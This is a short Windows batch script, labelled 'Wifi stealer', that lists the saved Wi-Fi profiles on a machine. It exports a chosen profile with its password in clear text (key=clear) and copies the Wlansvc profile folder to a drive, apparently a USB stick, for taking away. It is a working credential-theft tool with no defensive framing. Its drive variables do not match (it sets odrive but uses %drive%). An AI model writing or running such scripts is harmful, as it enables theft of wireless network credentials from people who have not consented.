@echo off
:: variables/min
SET odrive=%odrive:~0,2% 
:: looking for letter of flash
set backupcmd=xcopy /s /c /d /e /h /i /r /y
::setting letter
echo off
echo Wifi stealer
netsh wlan show profiles
set /p id="Enter Profile: "
netsh wlan export profile name="%id%" folder=. key=clear
%backupcmd% "%programdata%\Microsoft\Wlansvc\Profiles\Interfaces" "%drive%data\"
@echo off
pause